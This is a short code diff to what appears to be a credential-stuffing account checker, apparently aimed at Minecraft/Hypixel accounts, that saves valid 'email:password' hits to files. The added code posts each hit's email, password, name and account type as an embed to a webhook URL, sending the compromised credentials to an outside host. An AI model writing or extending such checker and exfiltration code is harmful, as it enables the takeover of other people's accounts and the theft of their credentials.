@@ -134,6 +134,29 @@ class Capture:
             other += 1
             with open(f"results/{fname}/other.txt", 'a', encoding='utf-8') as file:
                 file.write(f"{self.email}:{self.password} | {self.name}\n")
+        
+        # Enviar embed al webhook para cada hit
+        if webhook_url:
+            embed_data = {
+                "embeds": [{
+                    "title": "New Hit Detected!",
+                    "color": 65280,  # Verde (0x00FF00 en decimal)
+                    "fields": [
+                        {"name": "Email", "value": self.email, "inline": True},
+                        {"name": "Password", "value": self.password, "inline": True},
+                        {"name": "Name", "value": self.name, "inline": True},
+                        {"name": "Account Type", "value": self.account_type, "inline": True}
+                    ],
+                    "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S+02:00', time.localtime())  # Formato ISO con zona horaria CEST
+                }]
+            }
+            try:
+                response = requests.post(webhook_url, json=embed_data, timeout=10)
+                if response.status_code not in [200, 204]:
+                    print(Fore.YELLOW + f"Failed to send hit embed to webhook. Status code: {response.status_code}")
+            except requests.exceptions.RequestException as e:
+                print(Fore.YELLOW + f"Error sending hit embed to webhook: {str(e)}")
+
         try:
             self.hypixel()
         except:
